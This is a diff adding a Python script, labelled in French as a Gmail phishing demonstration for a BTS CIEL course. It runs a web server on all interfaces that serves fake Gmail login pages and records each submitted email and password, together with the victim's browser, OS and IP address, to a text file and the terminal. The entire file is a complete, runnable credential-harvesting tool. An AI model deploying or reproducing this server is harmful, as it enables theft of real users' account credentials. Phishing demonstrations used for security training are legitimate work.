@@ -1,0 +1,185 @@
+#!/usr/bin/env python3
+"""
+Serveur de démonstration phishing Gmail - BTS CIEL
+Récupère email, mot de passe, navigateur, OS et IP
+"""
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+import datetime
+import os
+import urllib.parse
+import platform
+
+class GmailPhishingHandler(BaseHTTPRequestHandler):
+    
+    def log_message(self, format, *args):
+        pass
+    
+    def do_GET(self):
+        parsed_path = urllib.parse.urlparse(self.path)
+        path = parsed_path.path
+        
+        if path == '/':
+            self.serve_file('gmail_login.html')
+        elif path == '/gmail_password.html':
+            self.serve_file('gmail_password.html')
+        elif path == '/gmail_inbox.html':
+            self.serve_file('gmail_inbox.html')
+        else:
+            self.send_error(404)
+    
+    def serve_file(self, filename):
+        try:
+            with open(filename, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(content.encode('utf-8'))
+        except FileNotFoundError:
+            self.send_error(404, f"File {filename} not found")
+    
+    def do_POST(self):
+        if self.path == '/login':
+            content_length = int(self.headers.get('Content-Length', 0))
+            if content_length > 0:
+                post_data = self.rfile.read(content_length)
+                try:
+                    data = json.loads(post_data.decode('utf-8'))
+                    
+                    email = data.get('email', '')
+                    password = data.get('password', '')
+                    timestamp = data.get('timestamp', '')
+                    
+                    if email and password:
+                        # Récupérer les infos du navigateur et système
+                        user_agent = self.headers.get('User-Agent', 'Inconnu')
+                        browser_info = self.parse_user_agent(user_agent)
+                        ip_address = self.client_address[0]
+                        
+                        self.save_credentials(email, password, timestamp, browser_info, ip_address, user_agent)
+                        
+                        # Affichage détaillé dans le terminal
+                        self.print_terminal_info(email, password, browser_info, ip_address)
+                    
+                except json.JSONDecodeError:
+                    pass
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
+    
+    def parse_user_agent(self, user_agent):
+        """Analyse le User-Agent pour extraire navigateur et OS"""
+        browser = "Inconnu"
+        os_info = "Inconnu"
+        
+        # Détection du navigateur
+        if "Chrome" in user_agent and "Edg" not in user_agent:
+            browser = "Google Chrome"
+        elif "Firefox" in user_agent:
+            browser = "Mozilla Firefox"
+        elif "Safari" in user_agent and "Chrome" not in user_agent:
+            browser = "Apple Safari"
+        elif "Edg" in user_agent:
+            browser = "Microsoft Edge"
+        elif "Opera" in user_agent:
+            browser = "Opera"
+        
+        # Détection du système d'exploitation
+        if "Windows" in user_agent:
+            os_info = "Windows"
+            if "Windows NT 10.0" in user_agent:
+                os_info = "Windows 10/11"
+            elif "Windows NT 6.3" in user_agent:
+                os_info = "Windows 8.1"
+            elif "Windows NT 6.2" in user_agent:
+                os_info = "Windows 8"
+            elif "Windows NT 6.1" in user_agent:
+                os_info = "Windows 7"
+        elif "Mac" in user_agent:
+            os_info = "macOS"
+        elif "Linux" in user_agent:
+            os_info = "Linux"
+        elif "Android" in user_agent:
+            os_info = "Android"
+        elif "iOS" in user_agent or "iPhone" in user_agent:
+            os_info = "iOS"
+        
+        return {
+            "browser": browser,
+            "os": os_info,
+            "user_agent": user_agent
+        }
+    
+    def save_credentials(self, email, password, timestamp, browser_info, ip_address, user_agent):
+        filename = "gmail_credentials.txt"
+        
+        entry = f"""
+{'='*70}
+GMAIL CREDENTIALS CAPTURED - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+{'='*70}
+📧 EMAIL: {email}
+🔑 MOT DE PASSE: {password}
+🕐 TIMESTAMP: {timestamp}
+🌐 NAVIGATEUR: {browser_info['browser']}
+💻 SYSTÈME: {browser_info['os']}
+📍 ADRESSE IP: {ip_address}
+{'='*70}
+USER AGENT COMPLET:
+{user_agent}
+{'='*70}
+"""
+        
+        try:
+            with open(filename, 'a', encoding='utf-8') as f:
+                f.write(entry)
+            print(f"💾 Données sauvegardées dans: {filename}")
+        except Exception as e:
+            print(f"❌ Erreur sauvegarde: {e}")
+    
+    def print_terminal_info(self, email, password, browser_info, ip_address):
+        """Affiche les informations de manière stylisée dans le terminal"""
+        print(f"\n🎣 NOUVELLE CONNEXION CAPTURÉE")
+        print(f"{'═' * 50}")
+        print(f"📧 Email: {email}")
+        print(f"🔑 Mot de passe: {password}")
+        print(f"🌐 Navigateur: {browser_info['browser']}")
+        print(f"💻 Système: {browser_info['os']}")
+        print(f"📍 IP: {ip_address}")
+        print(f"🕐 Heure: {datetime.datetime.now().strftime('%H:%M:%S')}")
+        print(f"{'═' * 50}")
+
+def get_server_info():
+    """Récupère les infos du serveur"""
+    print("🖥️  Informations du serveur:")
+    print(f"   Système: {platform.system()} {platform.release()}")
+    print(f"   Machine: {platform.machine()}")
+    print(f"   Processeur: {platform.processor()}")
+    print(f"   Python: {platform.python_version()}")
+
+def start_gmail_phishing():
+    server = HTTPServer(('0.0.0.0', 8080), GmailPhishingHandler)
+    
+    print("🎣 SERVEUR GMAIL PHISHING DÉMARRÉ")
+    print("=" * 60)
+    get_server_info()
+    print("=" * 60)
+    print("🌐 Adresse: http://localhost:8080")
+    print("📁 Fichier de logs: gmail_credentials.txt")
+    print("📊 Capture: Email, MDP, Navigateur, OS, IP")
+    print("=" * 60)
+    print("\n🕵️  En attente de connexions...\n")
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\n🛑 Serveur arrêté")
+        server.server_close()
+
+if __name__ == "__main__":
+    start_gmail_phishing()
